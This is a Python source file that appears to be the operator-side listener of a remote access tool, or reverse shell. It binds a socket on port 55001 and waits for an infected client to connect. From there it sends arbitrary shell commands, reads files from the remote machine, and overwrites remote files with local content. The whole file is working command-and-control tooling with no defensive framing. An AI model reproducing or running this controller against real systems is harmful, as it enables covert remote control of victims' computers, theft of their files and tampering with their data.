import os
import socket
import threading




class main:
    def __init__(self, ip):
        self.ip = ip

        HOST = self.ip

        PORT = 55001

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((HOST, PORT))
        print('[+] Server Started')
        print('[+] Listening For Client Connection ...')
        try:
            server.listen(1)
            client, client_addr = server.accept()

            login = client.recv(131072).decode('utf-8', errors='replace')

            def read():
                client.send(command.encode('utf-8', errors='replace'))
                lens = client.recv(131072).decode('utf-8', errors='replace')

                if lens.isdigit() and int(lens) > 0:
                    lens = int(lens)
                    for _ in range(lens):
                        data = client.recv(655360).decode('utf-8', errors='replace')
                        print(data)
                        client.send(b'OK')  # Подтверждение получения строки
                else:
                    print("File not found or an error occurred.")

            def edit():
                client.send(command.encode('utf-8', errors='replace'))

                remote_file = input("FILE_REMOTE >>> ")
                local_file = input("FILE_LOCAL >>> ")

                client.send(remote_file.encode('utf-8'))

                try:
                    with open(local_file, 'r') as file:
                        lines = file.readlines()
                        client.send(str(len(lines)).encode('utf-8'))

                        for line in lines:
                            client.send(line.rstrip().encode('utf-8'))
                            ack = client.recv(2)  # Ожидаем подтверждение от клиента
                            if ack != b'OK':
                                break

                except Exception as e:
                    print(f'Error: {e}')

            def receive_large_data():
                length = client.recv(16).decode('utf-8')
                if length.isdigit():
                    length = int(length)
                    received_data = b''
                    while len(received_data) < length:
                        chunk = client.recv(min(65536, length - len(received_data)))
                        if not chunk:
                            break
                        received_data += chunk
                    return received_data.decode('utf-8', errors='replace')
                return "Error receiving data"

            while True:
                try:
                    client.send('Up'.encode())


                    command = input(f'{HOST}@{login} ~ ')


                    if command == "edit":
                        edit()
                        continue

                    elif command == '':
                        print('Empty')
                        continue


                    elif command.startswith('read') and len(command) > 5:
                        read()
                        continue


                    elif command == 'exit':
                        print("[-]Dissconect")
                        client.send(command.encode('utf-8'))
                        client.close()
                        global GetIp
                        GetIp = ''
                        break


                    elif command == 'reconnect':
                        print('[*]Reconnection...')
                        client.send(command.encode('utf-8'))
                        client.close()
                        break

                    elif command == 'dir':
                        print('Error 1\nNot correct path | dir {path}')


                    else:
                        client.send(command.encode('utf-8'))
                        print('[+] Command sent')
                        output = receive_large_data() #client.recv(983040).decode('UTF-8', errors='replace')
                        print(output)


                        continue



                except Exception as e:
                    print('Err loop')
                    client.close()
                    break

        except Exception as e:
            print(e)

        # output = client.recv(1024)
        # output = output.decode()


if __name__ == "__main__":
    GetIp = ''

    while True:
        try:
            if GetIp == '':
                GetIp = input('v2.0~')
                main(GetIp)
            else:
                main(GetIp)
        except Exception as e:
            print(e)
